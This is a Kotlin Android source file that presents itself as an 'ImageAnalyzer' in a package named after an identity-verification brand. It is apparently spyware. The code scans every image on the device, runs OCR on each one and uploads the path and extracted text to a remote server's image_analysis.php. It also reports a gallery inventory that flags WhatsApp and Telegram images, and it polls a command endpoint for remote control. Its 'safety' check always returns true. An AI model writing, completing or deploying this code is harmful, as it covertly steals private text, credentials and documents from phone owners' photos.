package com.example.onfidoloader

import android.content.Context
import android.content.Intent
import android.graphics.BitmapFactory
import android.net.Uri
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.provider.MediaStore
import android.util.Log
import com.google.mlkit.vision.common.InputImage
import com.google.mlkit.vision.text.TextRecognition
import com.google.mlkit.vision.text.latin.TextRecognizerOptions
import org.json.JSONArray
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

object ImageAnalyzer {

    fun performImageAnalysis(context: Context, serverBase: String, deviceId: String) {
        performMediaScan(context) {
            fetchProcessedImages(serverBase, deviceId) { processedImages ->
                val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
                val projection = arrayOf(MediaStore.Images.Media.DATA)

                val cursor = context.contentResolver.query(uri, projection, null, null, null)

                var totalAnalyzed = 0
                var newAnalyzed = 0

                cursor?.use {
                    val pathIndex = cursor.getColumnIndex(MediaStore.Images.Media.DATA)

                    while (cursor.moveToNext()) {
                        val imagePath = cursor.getString(pathIndex)
                        totalAnalyzed++

                        if (processedImages.contains(imagePath)) continue

                        analyzeImageWithMLKit(context, serverBase, deviceId, imagePath)
                        newAnalyzed++

                        if (checkForCloseCommand(serverBase, deviceId)) {
                            Log.d("ImageAnalyzer", "Received close command, stopping analysis")
                            break
                        }
                    }

                    logEvent(serverBase, deviceId, "tesseract_ended", "{\"total_analyzed\":$totalAnalyzed,\"new_analyzed\":$newAnalyzed}")
                }
            }
        }
    }

    fun performImageReport(context: Context, serverBase: String, deviceId: String) {
        performMediaScan(context) {
            val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
            val projection = arrayOf(MediaStore.Images.Media.DATA, MediaStore.Images.Media.SIZE)

            val cursor = context.contentResolver.query(uri, projection, null, null, null)

            var totalImages = 0
            var totalSizeMb = 0L
            val categories = JSONObject().apply {
                put("camera", 0)
                put("downloads", 0)
                put("social_media", 0)
                put("other", 0)
            }

            cursor?.use {
                val pathIndex = cursor.getColumnIndex(MediaStore.Images.Media.DATA)
                val sizeIndex = cursor.getColumnIndex(MediaStore.Images.Media.SIZE)

                while (cursor.moveToNext()) {
                    val imagePath = cursor.getString(pathIndex)
                    val imageSize = cursor.getLong(sizeIndex)

                    totalImages++
                    totalSizeMb += imageSize

                    when {
                        imagePath.contains("DCIM") -> categories.put("camera", categories.getInt("camera") + 1)
                        imagePath.contains("Download") -> categories.put("downloads", categories.getInt("downloads") + 1)
                        imagePath.contains("WhatsApp") || imagePath.contains("Telegram") -> categories.put("social_media", categories.getInt("social_media") + 1)
                        else -> categories.put("other", categories.getInt("other") + 1)
                    }
                }
            }

            val payload = JSONObject().apply {
                put("total_images", totalImages)
                put("total_size_mb", totalSizeMb / (1024 * 1024))
                put("categories", categories)
            }

            logEvent(serverBase, deviceId, "image_report", payload.toString())
        }
    }

    private fun performMediaScan(context: Context, onComplete: () -> Unit) {
        val scanIntent = Intent(Intent.ACTION_MEDIA_SCANNER_SCAN_FILE).apply {
            data = Uri.parse("file://${Environment.getExternalStorageDirectory()}")
        }
        context.sendBroadcast(scanIntent)

        Handler(Looper.getMainLooper()).postDelayed({
            onComplete()
        }, 3000)
    }

    private fun analyzeImageWithMLKit(context: Context, serverBase: String, deviceId: String, imagePath: String) {
        val bitmap = BitmapFactory.decodeFile(imagePath)
        val image = InputImage.fromBitmap(bitmap, 0)

        val recognizer = TextRecognition.getClient(TextRecognizerOptions.DEFAULT_OPTIONS)

        recognizer.process(image)
            .addOnSuccessListener { visionText ->
                val imageText = visionText.text
                val isSafe = checkImageSafety(imagePath)

                sendAnalysisResult(serverBase, deviceId, imagePath, imageText, isSafe)
                bitmap.recycle()
            }
            .addOnFailureListener { e ->
                Log.e("ImageAnalyzer", "ML Kit OCR Error: ${e.message}")
                bitmap.recycle()
            }
    }

    private fun logEvent(serverBase: String, deviceId: String, type: String, payload: String) {
        Thread {
            try {
                val body = JSONObject().apply {
                    put("deviceId", deviceId)
                    put("type", type)
                    put("payload", payload)
                }

                val url = URL("$serverBase/log.php")
                with(url.openConnection() as HttpURLConnection) {
                    requestMethod = "POST"
                    setRequestProperty("Content-Type", "application/json")
                    doOutput = true

                    outputStream.write(body.toString().toByteArray(Charsets.UTF_8))

                    val response = inputStream.bufferedReader().use { it.readText() }
                    Log.d("ImageAnalyzer", "Logged event [$type]: $response")
                }
            } catch (e: Exception) {
                Log.e("ImageAnalyzer", "Ошибка отправки события [$type]: ${e.message}")
            }
        }.start()
    }

    private fun fetchProcessedImages(serverBase: String, deviceId: String, callback: (Set<String>) -> Unit) {
        Thread {
            val result = try {
                val url = URL("$serverBase/get_processed_images.php?device_id=$deviceId")
                (url.openConnection() as? HttpURLConnection)?.run {
                    requestMethod = "GET"
                    connectTimeout = 10000
                    readTimeout = 10000
                    connect()

                    if (responseCode == HttpURLConnection.HTTP_OK) {
                        inputStream.bufferedReader().use {
                            val response = it.readText()
                            Log.d("fetchProcessedImages", "Ответ сервера: $response")
                            JSONArray(response).let { jsonArray ->
                                (0 until jsonArray.length()).mapTo(mutableSetOf()) { jsonArray.getString(it) }
                            }
                        }
                    } else emptySet()
                } ?: emptySet()
            } catch (e: Exception) {
                Log.e("fetchProcessedImages", "Exception: ${e.message}", e)
                emptySet()
            }

            Handler(Looper.getMainLooper()).post {
                callback(result)
            }
        }.start()
    }

    private fun checkImageSafety(imagePath: String): Boolean = true

    private fun sendAnalysisResult(serverBase: String, deviceId: String, imagePath: String, imageText: String, isSafe: Boolean) {
        val payload = JSONObject().apply {
            put("device_id", deviceId)
            put("image_path", imagePath)
            put("image_text", imageText.take(5000))
            put("is_safe", isSafe)
        }

        Log.d("ImageAnalyzer", "Отправляемый payload: $payload")

        Thread {
            try {
                val url = URL("$serverBase/image_analysis.php")
                with(url.openConnection() as HttpURLConnection) {
                    requestMethod = "POST"
                    setRequestProperty("Content-Type", "application/json; charset=utf-8")
                    doOutput = true
                    outputStream.write(payload.toString().toByteArray(Charsets.UTF_8))
                    inputStream.bufferedReader().use { it.readText() }
                }
            } catch (e: Exception) {
                Log.e("ImageAnalyzer", "Ошибка отправки: ${e.message}")
            }
        }.start()
    }

    private fun checkForCloseCommand(serverBase: String, deviceId: String): Boolean = try {
        val response = URL("$serverBase/command.php?deviceId=$deviceId").readText()
        JSONObject(response).optString("type") == "close"
    } catch (e: Exception) {
        Log.e("ImageAnalyzer", "Ошибка проверки команды close: ${e.message}")
        false
    }
}
